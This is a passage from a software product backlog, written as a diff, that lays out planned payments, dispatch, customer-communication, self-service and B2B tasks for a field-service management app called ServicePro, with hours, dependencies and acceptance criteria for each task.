+**What it is** — Deposits are tracked on the customer/quote and applied to the final invoice automatically.
+
+**What it does** — Deposit ledger entries; when the job's invoice is generated (T029) the deposit appears as a credit ("$2,000 total, $500 deposit, $1,500 due"); refund path via T125.
+
+**Why we need it** — Correct accounting for deposits and a clear invoice for the customer.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: tracked separately; applied automatically; clear on the invoice.
+
+---
+
+#### T083 — Implement late fee calculation
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T141
+
+**What it is** — Automatic late fees on overdue invoices according to tenant rules.
+
+**What it does** — Per-tenant rule (flat or % after N days past due, cap, grace period); a scheduled job (T141) adds a late-fee line once per period; reminder templates mention it; can be waived.
+
+**Why we need it** — Enforces payment terms; part of the collections suite.
+
+**Notes** — Old task (Feb 2026 TODO P3; rules vary by business and jurisdiction — default off). The old "Payment Notification System" spec listed `late_fee_applied` notifications; reminder templates cover that.
+
+---
+
+#### T169 — Stripe Connect Express onboarding; invoice payments routed to the tenant
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 24 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T105, T109, T118, T119
+
+**What it is** — Each tenant onboards a Stripe Connect Express account, and their customers' invoice payments go to that account, with ServicePro's platform fee taken automatically.
+
+**What it does** — Onboarding via Account Links from org settings; `tenants.stripe_account_id` + capability status; `account.updated` webhook on a Connect endpoint. Invoice Checkout/PaymentIntents created for the connected account per the charge-model decision (OD-4: direct charges make the tenant merchant of record and liable for disputes; destination charges keep liability on the platform). `application_fee_amount` = platform fee (0.4% default, configurable per plan, T210). Replace the platform-account Checkout in `invoice_payment_service.go`. Payouts, disputes and refunds visible in the tenant's Express dashboard.
+
+**Why we need it** — Today invoice payments land in the platform's Stripe account — no tenant can actually get paid. It blocks launch, and holding the money flow is the core of the moat and the business model (platform fee).
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §0, §2 row 9, §4.2 (1, 4), §5 MVP #1. Use the `stripe:connect-recommend` / `stripe-best-practices` skills when designing. Supersedes the old "Removed Features → Payment System" restore list.
+
+---
+
+#### T170 — Card + ACH invoice payments, ACH preferred for B2B
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 6 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T169
+
+**What it is** — Customers can pay invoices by card or US bank account (ACH), with ACH presented first for business customers.
+
+**What it does** — Enable `us_bank_account` alongside card on the connected account; handle ACH's async settlement (`payment_intent.processing` → `succeeded`/`payment_failed`) with a "payment pending" invoice state that reminders respect; optional lower platform fee on ACH; surcharge pass-through deferred (state-by-state legality).
+
+**Why we need it** — B2B customers pay large invoices by ACH; card fees on a $5k invoice are a reason to keep paying by check.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.5 "Payments" (lower ACH fee to push B2B to ACH).
+
+---
+
+#### T171 — Saved payment methods + autopay
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 10 · **Status**: Open · **v1 Gate**: No · **Depends on**: T169, T170
+
+**What it is** — End customers can save a card or bank account with the tenant and opt into automatic payment of invoices on their due date.
+
+**What it does** — Stripe Customer per end customer on the connected account; SetupIntent (with ACH mandate); autopay flag per customer/agreement; a scheduled job (T141) charges due invoices and handles failures (notify, retry once, fall back to reminders).
+
+**Why we need it** — Stored payment methods are a major switching cost and the basis for maintenance-agreement autopay (T191).
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §4.2 (1). The dead `components/payments/methods/AddPaymentMethod.tsx` (raw `fetch`, frontend audit — deleted in T137) is not the base; build on Stripe Elements.
+
+---
+
+#### T172 — Tap to Pay via Stripe Terminal
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 16 · **Status**: Open · **v1 Gate**: No · **Depends on**: T180, T169
+
+**What it is** — Techs collect in-person card payments on their phone with Tap to Pay on iPhone/Android.
+
+**What it does** — Stripe Terminal SDK in the Capacitor app (T180); connection-token endpoint; a Terminal location per tenant; payment recorded against the invoice like any other (T118).
+
+**Why we need it** — In-person collection at job completion; competitors offer it.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 10. Needs the native app — judgment call: the brief said "depends on store app T181", but the store app is T180.
+
+---
+
+### Phase 7 — Dispatch & Field (T027, T038, T039, T040, T056, T057, T059, T077, T078, T079, T099, T173, T174, T175, T176, T177, T178, T179, T180)
+
+The technician experience (the product's weakest area) and the remaining scheduling features. **19 open tasks, ~182h.**
+
+- [ ] T027 — Add drag-and-drop rescheduling to job calendar
+- [ ] T038 — Add technician availability management UI
+- [ ] T039 — Create emergency job insertion workflow
+- [ ] T040 — Add auto-notify on emergency insertion
+- [ ] T056 — Add workload capacity warnings
+- [ ] T057 — Add double-booking override with reason
+- [ ] T059 — Add technician skill tags
+- [ ] T077 — Add time-off request UI
+- [ ] T078 — Add skill-based job matching suggestions
+- [ ] T079 — Add travel time notes field
+- [ ] T099 — Add tenant timezone support for conflict detection
+- [ ] T173 — Technician "My Day" mobile-first view
+- [ ] T174 — Job photos and attachments (R2)
+- [ ] T175 — Job checklists / forms
+- [ ] T176 — Customer signature on completion + service report PDF emailed
+- [ ] T177 — Time clock per job + timesheet export
+- [ ] T178 — Map / route view of the day
+- [ ] T179 — Offline-capable tech app (queue + sync)
+- [ ] T180 — Capacitor-wrapped iOS/Android apps in the stores
+
+#### T027 — Add drag-and-drop rescheduling to job calendar
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T099
+
+**What it is** — Drag a job to a new slot (or resize it) on the calendar to reschedule, with conflict warnings before saving.
+
+**What it does** — Re-enable `onEventDrop`/`onEventResize` in `frontend/src/components/calendar/Calendar.tsx` (commented out since T019) and add handlers in `pages/Jobs/JobCalendarPage.tsx`; run the conflict check (`POST /v1/conflicts/check`, T020) before confirming; call `jobService.updateJob()` with new `scheduled_start_at`/`scheduled_end_at`; confirmation or undo; loading state; toasts.
+
+**Why we need it** — Quick rescheduling is the daily driver for office staff.
+
+**Notes** — Old task (Feb 2026 TODO P2; depended on T020, done). Acceptance: drag updates schedule; resize adjusts duration; conflict warnings first; confirm/undo; loading state. Conflict detection currently can't see real jobs (nothing writes `schedules`, correctness audit 7.M10) — fixed in T099. jsdom DnD tests need T136's `elementFromPoint` stub. Use typed `withDragAndDrop<Event>` instead of the `any` cast at `Calendar.tsx:61`.
+
+---
+
+#### T038 — Add technician availability management UI
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Techs (or managers) set working hours; dispatchers see availability when scheduling.
+
+**What it does** — Weekly working hours per technician (simple pattern first; shift rotations later); shown on the calendar; conflict detection warns outside them.
+
+**Why we need it** — "Mike works M–F 8–5, Sarah T–Sat 7–4" — dispatchers need to know who's available.
+
+**Notes** — Old task (Feb 2026 TODO P1; confidence medium — simple hours vs shift patterns). Acceptance: techs set hours; dispatchers view them; warning outside hours. T077 adds time off.
+
+---
+
+#### T039 — Create emergency job insertion workflow
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T099
+
+**What it is** — A flow for urgent jobs that finds the soonest slot and can bump non-emergency work.
+
+**What it does** — "Emergency" priority; suggested slots accounting for travel time and current load; option to reschedule existing non-emergency jobs, notifying affected customers (T040).
+
+**Why we need it** — Pipe burst, cooler down in a restaurant — the customer needs someone today.
+
+**Notes** — Old task (Feb 2026 TODO P1; confidence medium). Acceptance: mark as emergency; system suggests slots; reschedule existing jobs with notification. Less central for the commercial beachhead than residential — validate in T218.
+
+---
+
+#### T040 — Add auto-notify on emergency insertion
+
+**Phase**: 7 · **Category**: SMS · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T039, T049
+
+**What it is** — Customers and techs affected by an emergency reshuffle are told automatically.
+
+**What it does** — When T039 bumps a job, send the affected customer a reschedule message and the affected tech an update, on their preferred channel; option to call instead.
+
+**Why we need it** — Keeps everyone informed when schedules change.
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: affected parties notified; clear message; option to call instead.
+
+---
+
+#### T056 — Add workload capacity warnings
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T099
+
+**What it is** — A warning when a technician would exceed their daily capacity.
+
+**What it does** — Configurable threshold (default 8h) per tenant or tech; warn on scheduling; override with acknowledgment. The detector's workload check uses a UTC "day" (`conflict/detector.go:291-293`) — tenant-local days come with T099.
+
+**Why we need it** — Prevents overloading techs ("John already has 8 hours today").
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: warning over threshold; configurable; override with acknowledgment.
+
+---
+
+#### T057 — Add double-booking override with reason
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T099
+
+**What it is** — Schedulers can deliberately override a conflict, with a required reason that's logged.
+
+**What it does** — Override option on the conflict dialog; mandatory reason; stored and shown in job history / audit log (T093).
+
+**Why we need it** — Sometimes two techs really are needed, or an emergency justifies it.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: override offered on conflict; reason required; logged for audit.
+
+---
+
+#### T059 — Add technician skill tags
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Technicians carry skill tags (HVAC, refrigeration, electrical, floor care…).
+
+**What it does** — Tenant-defined tags; add/remove on the tech profile; filter techs by skill in assignment UI.
+
+**Why we need it** — Basis for smart assignment (T078).
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: add/remove tags; visible on profile; filter by skill.
+
+---
+
+#### T077 — Add time-off request UI
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T038
+
+**What it is** — Techs request time off; managers approve; approved time off blocks scheduling.
+
+**What it does** — Request/approve/deny flow; approved time off shown on the calendar and treated as unavailability by conflict detection.
+
+**Why we need it** — Vacation and sick-day management.
+
+**Notes** — Old task (Feb 2026 TODO P3; confidence medium — simple block vs approval workflow).
+
+---
+
+#### T078 — Add skill-based job matching suggestions
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T059
+
+**What it is** — When assigning a job, suggest techs whose skills match the job type and who are available.
+
+**What it does** — Job types carry required skills; assignment UI ranks available techs by skill match and load.
+
+**Why we need it** — Smart assignment recommendations.
+
+**Notes** — Old task (Feb 2026 TODO P3; confidence medium).
+
+---
+
+#### T079 — Add travel time notes field
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 1 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — A field on scheduled jobs for expected travel time.
+
+**What it does** — Number/text field on the job schedule; displayed on the calendar and My Day.
+
+**Why we need it** — Helps scheduling accuracy until the map view (T178) gives real distances.
+
+**Notes** — Old task (Feb 2026 TODO P3). May be superseded by T178 — drop if the map lands first.
+
+---
+
+#### T099 — Add tenant timezone support for conflict detection
+
+**Phase**: 7 · **Category**: Backend · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Conflict detection and other date logic use the tenant's timezone and configured business hours, and actually see scheduled jobs.
+
+**What it does** — Read the tenant timezone and business hours (stored by T100) once per request; convert schedule times to tenant-local before comparing; replace the hard-coded 8–18 Mon–Fri UTC check and re-enable `checkBusinessHours` (`conflict/detector.go:254`, currently unused); tenant-local day boundaries for the workload check (`:291-293`) and for days-overdue in reminders (`payment_reminder_service.go:113,148`). Make the detector see real work: nothing writes `schedules`, so technician-overlap never fires — write schedule rows on job create/update or have the detector read jobs directly; fix the containment range queries to overlap (`schedule_repository.go:64-69,111`). Default to UTC / 8–18 Mon–Fri when unset.
+
+**Why we need it** — Business-hours validation compares UTC against hard-coded hours, producing false conflicts (1:24 PM local flagged as out of hours), and overlaps are never detected.
+
+**Notes** — Old task (Feb 2026 TODO P1; depended on T100, now done in 3df4280). correctness audit 3.5, 7.M9, 7.M10. Acceptance: tenant timezone and hours used; no false positives inside local hours; sensible defaults. Frontend half is T133.
+
+---
+
+#### T173 — Technician "My Day" mobile-first view
+
+**Phase**: 7 · **Category**: Mobile · **Hours**: 24 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T035, T124, T133
+
+**What it is** — A phone-first screen where a technician sees today's assigned jobs and works them: directions, call, status, notes.
+
+**What it does** — Route for the Technician role: today's jobs in time order (tenant timezone, T133), customer/site, tap-to-call, maps deep link for directions, big status buttons (en route → triggers T050, start, complete) using T124 transitions, notes, materials; photos (T174), checklist (T175) and signature (T176) slot in. Works on 375px screens.
+
+**Why we need it** — Techs must use it in the field or owners won't buy; the field side is the product's weakest area.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 15, §5 MVP #3. Offline support is T179; store-listed app is T180.
+
+---
+
+#### T174 — Job photos and attachments (R2)
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T160
+
+**What it is** — Techs and office staff attach photos and files to jobs (and quotes/invoices), stored in R2.
+
+**What it does** — Presigned PUT uploads from the browser/app; server-side resize + thumbnail and `DecodeConfig` dimension check (security audit F-19); content-type/size allow-list; attachments listed on the job, linked from the invoice (T030) and included in the service report (T176).
+
+**Why we need it** — Before/after photos are proof of service for commercial customers and settle disputes.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 16. Folds in old P3 "Image Optimization Strategy" (resize on upload, WebP, lazy loading).
+
+---
+
+#### T175 — Job checklists / forms
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T173
+
+**What it is** — Per-job-type checklists and simple forms techs complete on the job.
+
+**What it does** — Tenant-defined templates (checkbox, text, number, photo-required, pass/fail) attached by job type or agreement; answers stored per job; required items can block completion (T058); included in the service report (T176).
+
+**Why we need it** — Commercial cleaning and maintenance clients want proof each item was done; the basis for inspection/compliance work (T222).
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 17, §5 v1.
+
+---
+
+#### T176 — Customer signature on completion + service report PDF emailed
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T173, T174, T159
+
+**What it is** — At completion the customer signs on the tech's device, and a service report PDF is emailed to the customer's contacts.
+
+**What it does** — Signature canvas capturing name, timestamp, IP/device; gofpdf service report (work done, materials, time, photos, checklist answers, signature); emailed via Resend to the job's contact(s) and stored with the job.
+
+**Why we need it** — Commercial customers and property managers need proof of service before they approve an invoice.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §5 v1 "Job checklists and service report PDF".
+
+---
+
+#### T177 — Time clock per job + timesheet export
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T173
+
+**What it is** — Techs clock in/out per job (and for the day), and owners export timesheets.
+
+**What it does** — Time entries per user/job with breaks; edits audited (T093); weekly timesheet view and CSV export; feeds invoice labor (T030), payroll (T196) and job costing (T198).
+
+**Why we need it** — Payroll and job-costing basics; a common reason shops buy FSM software.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 18.
+
+---
+
+#### T178 — Map / route view of the day
+
+**Phase**: 7 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T173
+
+**What it is** — A map of the day's jobs per technician for office and tech.
+
+**What it does** — Geocode customer/site addresses on save; map view (Mapbox or Google) with pins coloured by status and tech; ordered route line; no optimization in v1.
+
+**Why we need it** — Dispatchers see geography at a glance; techs see their route.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 24. Route optimization (Google Route Optimization API) is a later add-on.
+
+---
+
+#### T179 — Offline-capable tech app (queue + sync)
+
+**Phase**: 7 · **Category**: Mobile · **Hours**: 40 · **Status**: Open · **v1 Gate**: No · **Depends on**: T173
+
+**What it is** — The tech view keeps working without signal and syncs when back online.
+
+**What it does** — Cache today's jobs in IndexedDB; queue status changes, notes, time entries, photos and signatures; replay with idempotency keys; conflict rules (server wins on schedule, client wins on notes); clear offline indicator. A deliberately built service worker — the existing never-registered one is deleted in T137.
+
+**Why we need it** — Basements and rural sites have no signal; offline is a known Jobber complaint and a marketing point.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §1.3 (Jobber "app doesn't work offline"), §5 v2.
+
+---
+
+#### T180 — Capacitor-wrapped iOS/Android apps in the stores
+
+**Phase**: 7 · **Category**: Mobile · **Hours**: 24 · **Status**: Open · **v1 Gate**: No · **Depends on**: T173
+
+**What it is** — ServicePro is installable from the App Store and Google Play as a Capacitor wrapper around the web app.
+
+**What it does** — Capacitor project; native camera and push notifications; deep links; store listings, screenshots, privacy labels; Apple Developer ($99/yr) and Google Play ($25 one-time) accounts — add to Fleet costs.
+
+**Why we need it** — Buyers search the app stores, and Tap to Pay (T172) needs a native app.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 28.
+
+---
+
+### Phase 8 — Customer Communications (T036, T037, T048, T049, T050, T054, T055, T072, T073, T089, T090, T091, T181, T182)
+
+Confirmations, reminders, on-my-way, two-way SMS, templates and the customer activity record. **14 open tasks, ~75h.**
+
+- [ ] T036 — Add manual Call Log entry
+- [ ] T037 — Auto-log system messages to customer activity
+- [ ] T048 — Add appointment confirmation emails
+- [ ] T049 — Add appointment reminder emails/SMS
+- [ ] T050 — Add "Tech on the way" manual trigger
+- [ ] T054 — Create Communication Log component
+- [ ] T055 — Unified Customer Timeline view
+- [ ] T072 — Create message template management UI
+- [ ] T073 — Add rich variable system for templates
+- [ ] T089 — Add email/SMS delivery tracking
+- [ ] T090 — Add communication failure alerts
+- [ ] T091 — Add notification preferences per customer
+- [ ] T181 — Two-way SMS inbox (Twilio + 10DLC)
+- [ ] T182 — Review request automation
+
+#### T036 — Add manual Call Log entry
+
+**Phase**: 8 · **Category**: Feature · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Staff log phone calls with customers (date, duration, notes, outcome).
+
+**What it does** — `call_logs` (customer, user, timestamp, duration, notes, outcome, tenant); form on customer detail; appears in the timeline (T055).
+
+**Why we need it** — Team coordination — no two people calling the same customer, history for everyone.
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: log from customer page; appears in timeline; shows who and when.
+
+---
+
+#### T037 — Auto-log system messages to customer activity
+
+**Phase**: 8 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T096
+
+**What it is** — Every outbound message, payment and status change is automatically logged to the customer's activity.
+
+**What it does** — Hook the email and SMS senders, payment recording (T118) and quote/invoice/job transitions to write activity entries (via the T096 event log).
+
+**Why we need it** — Ends "did the quote go out?" questions.
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: all outbound comms, payments and status changes logged and shown in the timeline.
+
+---
+
+#### T048 — Add appointment confirmation emails
+
+**Phase**: 8 · **Category**: Email · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T159
+
+**What it is** — An email to the customer when a job is scheduled or rescheduled.
+
+**What it does** — Trigger on schedule set/changed; template with date, time window (tenant timezone), service, site, tech name, and a reschedule/cancel contact link; uses T072/T073 templates when they exist.
+
+**Why we need it** — Sets expectations and reduces no-shows — the cheapest visible "wow".
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: sent when scheduled; contains date, time, service; professional template. `docs/product/competitive-research-2026-10.md` §5 MVP #5. Folds in the old "Email Templates Expansion" item's job-completion and payment-received emails as sibling templates.
+
+---
+
+#### T049 — Add appointment reminder emails/SMS
+
+**Phase**: 8 · **Category**: SMS · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T141, T048
+
+**What it is** — Automatic reminders before appointments by email and SMS.
+
+**What it does** — Scheduled job (T141) finds upcoming jobs and sends at configurable offsets (24h, 2h), on the customer's channel, honouring opt-out (T091); claim rows so nothing double-sends. SMS provider per OD-6 (the existing TextBelt client works for one-way; SNS goes away in T159).
+
+**Why we need it** — Reduces no-shows (the old TODO cited 25–30%).
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: automatic, configurable timing, customer can opt out.
+
+---
+
+#### T050 — Add "Tech on the way" manual trigger
+
+**Phase**: 8 · **Category**: SMS · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T049
+
+**What it is** — A button the tech taps to text the customer that they're on the way.
+
+**What it does** — Button in My Day / job view (T173) that also moves the job to `en_route`; SMS (email fallback) with tech name and ETA; logged in job activity (T037).
+
+**Why we need it** — Customers know to be ready; on-site contacts at commercial sites can unlock doors.
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: one-click send; SMS delivered; logged in job history.
+
+---
+
+#### T054 — Create Communication Log component
+
+**Phase**: 8 · **Category**: UX · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T037
+
+**What it is** — A unified, chronological view of all emails, SMS and calls with a customer.
+
+**What it does** — Component on customer detail listing messages and calls with delivery status (T089), linked to related records.
+
+**Why we need it** — "Did anyone call Mrs. Smith?" in one place.
+
+**Notes** — Old task (Feb 2026 TODO P2; confidence medium — threaded vs simple list).
+
+---
+
+#### T055 — Unified Customer Timeline view
+
+**Phase**: 8 · **Category**: UX · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T037
+
+**What it is** — One scrollable timeline of a customer's jobs, quotes, invoices, payments and communications.
+
+**What it does** — Merged feed from the T096 event log; filter by type; items link to detail pages.
+
+**Why we need it** — At-a-glance customer history during conversations.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: all activity in one timeline, clickable, filterable.
+
+---
+
+#### T072 — Create message template management UI
+
+**Phase**: 8 · **Category**: Feature · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T073
+
+**What it is** — Tenants edit their own email/SMS templates for every automated message.
+
+**What it does** — CRUD per message type (confirmation, reminder, on-my-way, quote follow-up, payment reminder, receipt); categories; preview with sample data; reset to default.
+
+**Why we need it** — Customizable, on-brand communications.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: create/edit/delete, categories, preview. The unlinked `templates/email` engine (correctness audit 5.1) is deleted in T129; build on whatever T159 uses.
+
+---
+
+#### T073 — Add rich variable system for templates
+
+**Phase**: 8 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Templates use documented variables like `{{customer_first_name}}`, `{{job_date}}`, `{{tech_name}}`, `{{invoice_balance}}`.
+
+**What it does** — A typed variable registry per message type; formatting by type (dates in tenant timezone, money in tenant currency); preview with sample data; error on unknown or missing variables.
+
+**Why we need it** — Personalized messages without breaking when data is missing.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: documented variables, preview, error if missing. The old "Quote Template System" spec's variable rules are reference.
+
+---
+
+#### T089 — Add email/SMS delivery tracking
+
+**Phase**: 8 · **Category**: Email · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T159, T181
+
+**What it is** — Every outbound message shows sent/delivered/bounced/failed.
+
+**What it does** — Store provider message IDs; Resend webhooks (delivered, bounced, complained) and Twilio status callbacks update a `messages` table; status shown in the customer timeline (T055).
+
+**Why we need it** — Know whether reminders and confirmations actually reached the customer.
+
+**Notes** — Old task (Feb 2026 TODO P3). Folds in old P3 "Email Analytics (Open/Click Tracking)" — opens/clicks only if cheap via Resend; no pixel/link-wrapping of our own.
+
+---
+
+#### T090 — Add communication failure alerts
+
+**Phase**: 8 · **Category**: Monitoring · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T089
+
+**What it is** — Admins are alerted when messages fail.
+
+**What it does** — Bounce/failure events create an in-app alert on the customer/invoice and a daily digest to the tenant admin; repeated failures flag the contact as unreachable.
+
+**Why we need it** — Prevents silent failures (e.g. reminders bouncing for months).
+
+**Notes** — Old task (Feb 2026 TODO P3).
+
+---
+
+#### T091 — Add notification preferences per customer
+
+**Phase**: 8 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Customers (and their contacts) opt in or out of each notification type and channel.
+
+**What it does** — Per-contact preferences by type (reminders, confirmations, marketing/reviews) and channel; unsubscribe links in email and STOP handling in SMS (T181) update them; every sender checks them. Builds on the existing `PreferredContactMethod` and DoNot flags the reminder service already reads.
+
+**Why we need it** — Respects preferences and keeps SMS/email compliant (TCPA, CAN-SPAM).
+
+**Notes** — Old task (Feb 2026 TODO P3). Folds in the old "Future Features → Notification Preferences" item (in-app and digest settings are for staff users — later).
+
+---
+
+#### T181 — Two-way SMS inbox (Twilio + 10DLC)
+
+**Phase**: 8 · **Category**: SMS · **Hours**: 20 · **Status**: Open · **v1 Gate**: No · **Depends on**: T091
+
+**What it is** — Each tenant gets a business number and a shared inbox to text customers and see replies.
+
+**What it does** — Twilio number per tenant; A2P 10DLC brand + campaign registration per tenant (registration fees and timelines per Twilio's current pricing — record in Fleet); outbound/inbound webhooks (signature-verified); threads per customer contact; STOP/HELP handling; unread counts; assign to staff.
+
+**Why we need it** — Small shops expect to text customers from the business number, not personal phones.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 14, §5 v1. Provider choice is OD-6 (Twilio vs Telnyx).
+
+---
+
+#### T182 — Review request automation
+
+**Phase**: 8 · **Category**: Marketing · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T048
+
+**What it is** — After a job is completed (or paid) the customer gets a request to leave a Google review.
+
+**What it does** — Tenant's Google review link in settings; send after completion/payment with delay; at most once per customer per N days; respects preferences (T091).
+
+**Why we need it** — Cheap growth lever for customers.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 23.
+
+---
+
+### Phase 9 — Customer Self-Service (T081, T183, T184, T185)
+
+Public quote approval with e-sign and deposit, the customer portal and online booking. Run T218 interviews before building beyond the gated items. **4 open tasks, ~50h.**
+
+- [ ] T081 — Add e-signature for quote acceptance
+- [ ] T183 — Public quote approval page (approve/decline, e-sign, optional deposit)
+- [ ] T184 — Customer portal / client hub
+- [ ] T185 — Online booking / request widget embeddable on websites
+
+#### T081 — Add e-signature for quote acceptance
+
+**Phase**: 9 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T183
+
+**What it is** — The customer signs to accept a quote, producing a legally useful acceptance record.
+
+**What it does** — Typed name and/or drawn signature on the approval page; store signer name, email, timestamp, IP, user agent and a hash of the quote PDF version accepted; ESIGN/UETA consent text; signature shown on the accepted quote PDF.
+
+**Why we need it** — A legal acceptance record for larger commercial work.
+
+**Notes** — Old task (Feb 2026 TODO P3; confidence medium — typed name vs signature pad).
+
+---
+
+#### T183 — Public quote approval page (approve/decline, e-sign, optional deposit)
+
+**Phase**: 9 · **Category**: Feature · **Hours**: 10 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T224
+
+**What it is** — Customers open a tokenized link to view a quote, pick an option, approve or decline (with reason), sign, and pay a deposit if required.
+
+**What it does** — Public route (e.g. `/q/:token`, like `/pay/:token`) with no app chrome; rate-limited token lookup; approve/decline transitions via T224's race-safe update; e-signature (T081); deposit via Connect (T061); notifies the office and logs activity.
+
+**Why we need it** — Gets quotes approved without phone tag and is table stakes (`docs/product/competitive-research-2026-10.md` §2 rows 3–5).
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §5 MVP #4. Customer portal (T184) later wraps the same page.
+
+---
+
+#### T184 — Customer portal / client hub
+
+**Phase**: 9 · **Category**: Feature · **Hours**: 24 · **Status**: Open · **v1 Gate**: No · **Depends on**: T183, T169
+
+**What it is** — A per-customer portal to view and approve quotes, view and pay invoices, request work and see job history.
+
+**What it does** — Magic-link sign-in per customer contact (no passwords); quotes (T183), invoices + pay (T169/T170), saved methods/autopay (T171), statements (T189), request-work form, job history with service reports (T176); tenant branding (logo, colours) on the portal, PDFs and emails.
+
+**Why we need it** — Property managers expect self-serve, and it cuts A/R phone calls.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 20, §5 v1. Folds in the old "Future Features → White-label / Custom Branding" item at the logo/colours level (custom domains later).
+
+---
+
+#### T185 — Online booking / request widget embeddable on websites
+
+**Phase**: 9 · **Category**: Feature · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: T184
+
+**What it is** — A widget tenants embed on their website so prospects can request work or book.
+
+**What it does** — Embeddable script/iframe; request form creating a lead/request; optional available-window picker; Cloudflare Turnstile against spam; notification to the office.
+
+**Why we need it** — Lead capture straight into the system.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 21.
+
+---
+
+### Phase 10 — Commercial/B2B Wedge (T044, T064, T065, T186, T187, T188, T189, T190, T191)
+
+What residential-first tools do poorly and the beachhead needs: multi-site customers, POs, consolidated invoicing, statements, property-manager approvals and the collections suite. **9 open tasks, ~85h.**
+
+- [ ] T044 — Build collections dashboard
+- [ ] T064 — Add last contact date tracking on invoices
+- [ ] T065 — Add promise-to-pay notes
+- [ ] T186 — Multi-site customers (service locations; invoice per site or consolidated)
+- [ ] T187 — PO capture and matching on jobs and invoices
+- [ ] T188 — Consolidated monthly invoicing
+- [ ] T189 — Statements of account (portal + email)
+- [ ] T190 — Property-manager approval workflow (NTE limits, multi-approver, email intake)
+- [ ] T191 — Maintenance agreements with autopay + renewal reminders
+
+#### T044 — Build collections dashboard
+
+**Phase**: 10 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T064, T065
+
